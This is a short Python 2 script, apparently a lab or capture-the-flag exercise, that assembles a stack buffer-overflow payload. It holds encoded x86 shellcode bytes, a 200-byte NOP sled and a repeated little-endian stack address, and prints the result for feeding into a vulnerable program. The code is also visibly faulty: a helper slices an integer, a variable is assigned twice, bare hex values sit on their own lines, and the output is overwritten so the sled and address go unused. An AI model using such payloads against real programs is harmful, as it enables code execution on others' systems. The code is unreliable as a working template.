def print_address(address):
    string_address = "%08x"%address
    p4=address[:2]
    p3=address[2:4]
    p2=address[4:6]
    p3=address[6:8]
    print string_address
shellcode =  ""
shellcode += "\xdb\xd3\xd9\x74\x24\xf4\xb8\x5d\x3a\x1b\xc6\x5e\x2b"
shellcode += "\xc9\xb1\x0a\x31\x46\x19\x83\xee\xfc\x03\x46\x15\xbf"
shellcode += "\xcf\x71\xcd\x67\xa9\xd4\xb7\xff\xe4\xbb\xbe\x18\x9e"
shellcode += "\x14\xb2\x8e\x5f\x03\x1b\x2c\x09\xbd\xea\x53\x9b\xa9"
shellcode += "\xee\x93\x1c\x2a\x9d\xe0\x1c\x7d\x0e\x8f\xfc\x4c\x30"
nopsled = "\x90"*200
0xffffcbb0
0xffffd4fb
0xffffd4ca
#address = 0x08048578
address = '\xca\xd4\xff\xff' * 15
#output = address
output = nopsled + shellcode
output = shellcode

print output

